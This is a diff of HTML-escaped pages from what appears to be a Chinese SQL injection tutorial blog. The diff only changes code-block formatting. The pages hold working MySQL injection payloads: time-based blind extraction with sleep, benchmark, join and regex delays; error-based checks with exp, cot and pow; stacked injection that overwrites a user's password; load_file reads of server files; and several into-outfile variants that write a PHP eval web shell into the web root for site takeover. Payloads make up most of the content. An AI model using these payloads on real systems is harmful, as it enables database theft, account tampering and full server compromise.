-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and if(length(database())=4,sleep(5),1)#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;注意此处if函数有三个参数，最后一个失败执行的语句exp3不能为空，要填上1补空&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and if(length(database())=4,sleep(5),1)#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;注意此处if函数有三个参数，最后一个失败执行的语句exp3不能为空，要填上1补空&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;如果不用if，也是可以的：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and sleep((ascii(substring(database(),1,1))=100)*5)#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;页面休眠了五秒，说明语句执行成功（sleep()返回了1,1*5=5），数据库名称长为4&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and sleep((ascii(substring(database(),1,1))=100)*5)#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;页面休眠了五秒，说明语句执行成功（sleep()返回了1,1*5=5），数据库名称长为4&lt;/p&gt;
 &lt;p&gt;如果if函数被过滤了：[case when语句代替if](#case when语句代替if)&lt;/p&gt;
 &lt;h4 id=&#34;benchmark延时&#34;&gt;benchmark延时
 &lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;benchmark(count, exp)：将表达式exp重复执行count次&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
 &lt;p&gt;只要我们让执行次数够多，就能达到和sleep一样的延迟效果：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100,benchmark(5000000,md5(&amp;#39;a&amp;#39;)),1)#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果数据库第一个字符是d，就让数据库计算五百万次a的md5值，这个过程近似五秒&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100,benchmark(5000000,md5(&amp;#39;a&amp;#39;)),1)#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果数据库第一个字符是d，就让数据库计算五百万次a的md5值，这个过程近似五秒&lt;/p&gt;
 &lt;h4 id=&#34;笛卡尔积延时&#34;&gt;笛卡尔积延时
 &lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;当查询发生在多个表中，并且没有任何限制条件时，会将多个表已笛卡尔积的形式联合起来：&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100, (SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 1)#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个查询将&lt;code&gt;information_schema.columns&lt;/code&gt;这张表自身进行了两次连接，查询起来很费时（大概要两三秒）&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100, (SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 1)#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个查询将&lt;code&gt;information_schema.columns&lt;/code&gt;这张表自身进行了两次连接，查询起来很费时（大概要两三秒）&lt;/p&gt;
 &lt;p&gt;如果感觉延时不够明显，可以多加几次自连接&lt;/p&gt;
 &lt;h4 id=&#34;正则匹配延时&#34;&gt;正则匹配延时
 &lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;通过构造正则表达式，让数据库的正则引擎在进行匹配时陷入大量的回溯计算，从而消耗极长的CPU时间：&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100, (select rpad(&amp;#39;a&amp;#39;,9999999,&amp;#39;a&amp;#39;) RLIKE concat(repeat(&amp;#39;(a.*)+&amp;#39;,30),&amp;#39;b&amp;#39;)), 1)#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们来看看其中的正则延时部分是怎么工作的：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select rpad(&amp;#39;a&amp;#39;,4999999,&amp;#39;a&amp;#39;) RLIKE concat(repeat(&amp;#39;(a.*)+&amp;#39;,30),&amp;#39;b&amp;#39;)
-&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100, (select rpad(&amp;#39;a&amp;#39;,9999999,&amp;#39;a&amp;#39;) RLIKE concat(repeat(&amp;#39;(a.*)+&amp;#39;,30),&amp;#39;b&amp;#39;)), 1)#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们来看看其中的正则延时部分是怎么工作的：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select rpad(&amp;#39;a&amp;#39;,4999999,&amp;#39;a&amp;#39;) RLIKE concat(repeat(&amp;#39;(a.*)+&amp;#39;,30),&amp;#39;b&amp;#39;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;&lt;strong&gt;&lt;code&gt;rpad(str,len,padstr)&lt;/code&gt;：用字符串&lt;code&gt;padstr&lt;/code&gt;对&lt;code&gt;str&lt;/code&gt;进行右边填补，直至它的长度达到&lt;code&gt;len&lt;/code&gt;，然后返回 &lt;code&gt;str&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;​			         &lt;strong&gt;如果&lt;code&gt;str&lt;/code&gt;的长度长于&lt;code&gt;len&lt;/code&gt;，那么它将被截除到&lt;code&gt;len&lt;/code&gt;个字符&lt;/strong&gt;&lt;/p&gt;
@@ -1376,31 +1446,31 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;exp(x)&lt;/code&gt;返回e的x次方，也就是e^x^&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;当传递给&lt;code&gt;exp()&lt;/code&gt;的参数过大（在MySQL中约大于&lt;strong&gt;709&lt;/strong&gt;）时，会产生数值越界错误&lt;/p&gt;
 &lt;p&gt;我们可以通过位运算符&lt;code&gt;~&lt;/code&gt;运算0获得一个巨大的整数：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100,exp(~0),1)#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们知道，&lt;code&gt;~0&lt;/code&gt;的结果是64位无符号整数的最大值，远大于709，因此&lt;code&gt;exp()&lt;/code&gt;函数执行时必定会溢出报错：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;DOUBLE value is out of range in &amp;#39;exp(~(0))&amp;#39;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;你也可以选择手动输入一个很大的数字，比如exp(99999)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100,exp(~0),1)#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们知道，&lt;code&gt;~0&lt;/code&gt;的结果是64位无符号整数的最大值，远大于709，因此&lt;code&gt;exp()&lt;/code&gt;函数执行时必定会溢出报错：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DOUBLE value is out of range in &amp;#39;exp(~(0))&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;你也可以选择手动输入一个很大的数字，比如exp(99999)&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;同样的，我们也可以不用if函数，只要利用判断的返回值做运算即可：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and exp((ascii(substring(database(),1,1))=100)*99999)#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;如果&lt;code&gt;ascii(substring(database(),1,1))=100&lt;/code&gt;为&lt;mark&gt;真&lt;/mark&gt;，那么运算式为&lt;code&gt;exp(1*99999)&lt;/code&gt;，也就是&lt;code&gt;exp(99999)&lt;/code&gt;，就会报错&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and exp((ascii(substring(database(),1,1))=100)*99999)#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;如果&lt;code&gt;ascii(substring(database(),1,1))=100&lt;/code&gt;为&lt;mark&gt;真&lt;/mark&gt;，那么运算式为&lt;code&gt;exp(1*99999)&lt;/code&gt;，也就是&lt;code&gt;exp(99999)&lt;/code&gt;，就会报错&lt;/strong&gt;&lt;/p&gt;
 &lt;h4 id=&#34;cot&#34;&gt;cot()
 &lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;cot()&lt;/code&gt;是余切三角函数，而众所周知，&lt;code&gt;cot(0)&lt;/code&gt;是不存在的：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100,cot(0),1)#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;也可以不用if函数：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and cot((ascii(substring(database(),1,1))=100)=0)#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;如果&lt;code&gt;ascii(substring(database(),1,1))=100&lt;/code&gt;为&lt;mark&gt;真&lt;/mark&gt;，那么运算式为&lt;code&gt;cot(1=0)&lt;/code&gt;，也就是&lt;code&gt;cot(0)&lt;/code&gt;，就会报错&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100,cot(0),1)#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;也可以不用if函数：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and cot((ascii(substring(database(),1,1))=100)=0)#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;如果&lt;code&gt;ascii(substring(database(),1,1))=100&lt;/code&gt;为&lt;mark&gt;真&lt;/mark&gt;，那么运算式为&lt;code&gt;cot(1=0)&lt;/code&gt;，也就是&lt;code&gt;cot(0)&lt;/code&gt;，就会报错&lt;/strong&gt;&lt;/p&gt;
 &lt;h4 id=&#34;pow&#34;&gt;pow()
 &lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;pow(a,b)&lt;/code&gt;函数用于求a^b^的值&lt;/strong&gt;，相信你已经知道怎么做了：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100,pow(99999,99999),1)#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不使用if函数：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and pow((ascii(substring(database(),1,1))=100)+1,99999)#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;如果&lt;code&gt;ascii(substring(database(),1,1))=100&lt;/code&gt;为&lt;mark&gt;真&lt;/mark&gt;，那么运算式就是&lt;code&gt;pow(1+1,99999)&lt;/code&gt;,也就是2^99999^，就会报错&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100,pow(99999,99999),1)#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不使用if函数：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and pow((ascii(substring(database(),1,1))=100)+1,99999)#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;如果&lt;code&gt;ascii(substring(database(),1,1))=100&lt;/code&gt;为&lt;mark&gt;真&lt;/mark&gt;，那么运算式就是&lt;code&gt;pow(1+1,99999)&lt;/code&gt;,也就是2^99999^，就会报错&lt;/strong&gt;&lt;/p&gt;
 &lt;h2 id=&#34;4-堆叠注入&#34;&gt;#4 堆叠注入
 &lt;/h2&gt;&lt;p&gt;有些应用服务执行sql使用的不是&lt;code&gt;mysqli_query()&lt;/code&gt;,而是&lt;code&gt;mysqli_multi_query()&lt;/code&gt;方法，可以做到执行多条sql语句&lt;/p&gt;
 &lt;h3 id=&#34;普通多语句注入&#34;&gt;普通多语句注入
 &lt;/h3&gt;&lt;p&gt;&lt;strong&gt;如果又恰好没有过滤&lt;code&gt;;&lt;/code&gt;，我们就能使用&lt;code&gt;;&lt;/code&gt;分割语句，利用sql语句进行各种操作：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,2;update users set password=123 where id=1--+
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样就篡改了密码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,2;update users set password=123 where id=1--+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样就篡改了密码&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;但能使用堆叠注入的场景一般都对语句做了过滤，尤其是select这样的核心查询语句，我们需要用别的来代替&lt;/strong&gt;&lt;/p&gt;
 &lt;h3 id=&#34;show查询&#34;&gt;show查询
 &lt;/h3&gt;&lt;h4 id=&#34;查询数据库名称&#34;&gt;查询数据库名称
@@ -1458,8 +1528,8 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &lt;/h3&gt;&lt;p&gt;&lt;strong&gt;利用&lt;code&gt;load_file&lt;/code&gt;函数能做到对服务器文件的读取：&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;load_file&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;D:\\1.txt&amp;#34;&lt;/span&gt;);
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;配合注入语句，我们可以做到读取任意文件（当然前提是页面会有输出）：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,load_file(&amp;#39;D:/WWW/1.txt&amp;#39;) #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250707205449502.png&#34;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,load_file(&amp;#39;D:/WWW/1.txt&amp;#39;) #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250707205449502.png&#34;
 	
 	
 	
@@ -1481,15 +1551,15 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;利用这一点，我们可以向服务器上传一句话木马&lt;/strong&gt;&lt;/p&gt;
 &lt;h4 id=&#34;union-select&#34;&gt;union select
 &lt;/h4&gt;&lt;p&gt;最常用的写入方式，在select内容中插入一句话木马&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,&amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; #
-&lt;/code&gt;&lt;/pre&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250707205900643.png&#34; alt=&#34;image-20250707205900643&#34;  /&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,&amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250707205900643.png&#34; alt=&#34;image-20250707205900643&#34;  /&gt;
 &lt;p&gt;虽然报错，但是文件也写入成功了：&lt;/p&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250707205828237.png&#34; alt=&#34;image-20250707205828237&#34;  /&gt;
 &lt;p&gt;&lt;strong&gt;接着就可以使用蚁剑等工具接管网站&lt;/strong&gt;&lt;/p&gt;
 &lt;h4 id=&#34;lines-terminated-by&#34;&gt;lines terminated by
 &lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;lines terminated by&lt;/code&gt;用来定义导出的文件中每行数据以什么字符结尾（默认是换行符 &lt;code&gt;\n&lt;/code&gt;）：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; lines terminated by &amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708141833937.png&#34;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; lines terminated by &amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708141833937.png&#34;
 	
 	
 	
@@ -1501,8 +1571,8 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &gt;&lt;/p&gt;
 &lt;h4 id=&#34;lins-starting-by&#34;&gt;lins starting by
 &lt;/h4&gt;&lt;p&gt;&lt;strong&gt;与上一种相反，它控制的是每一行开始位置的内容：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; lines starting by &amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708141731385.png&#34;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; lines starting by &amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708141731385.png&#34;
 	
 	
 	
@@ -1514,8 +1584,8 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &gt;&lt;/p&gt;
 &lt;h4 id=&#34;fields-terminated-by&#34;&gt;fields terminated by
 &lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;fields terminated by&lt;/code&gt;控制的是一行数据中，各个字段（列）之间的分隔符：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; fields terminated by &amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708142123580.png&#34;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; fields terminated by &amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708142123580.png&#34;
 	
 	
 	
@@ -1527,14 +1597,14 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &gt;&lt;/p&gt;
 &lt;h4 id=&#34;columns-terminated-by&#34;&gt;columns terminated by
 &lt;/h4&gt;&lt;p&gt;&lt;strong&gt;是上一种的同义词，作用完全一样：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; columns terminated by &amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; #
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;日志文件写入&#34;&gt;日志文件写入
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; columns terminated by &amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;日志文件写入&#34;&gt;日志文件写入
 &lt;/h3&gt;&lt;p&gt;如果mysql无法更改导出文件路径，或者根本不允许导出路径，我们还可以通过日志文件注入&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;写入的前提是要开启&lt;code&gt;general log&lt;/code&gt;或者&lt;code&gt;slow_query_log&lt;/code&gt;模式，并设置目录地址&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;下面用&lt;code&gt;general log&lt;/code&gt;做演示&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;查看配置：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;show variables like &amp;#39;%general%&amp;#39;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708165305034.png&#34;
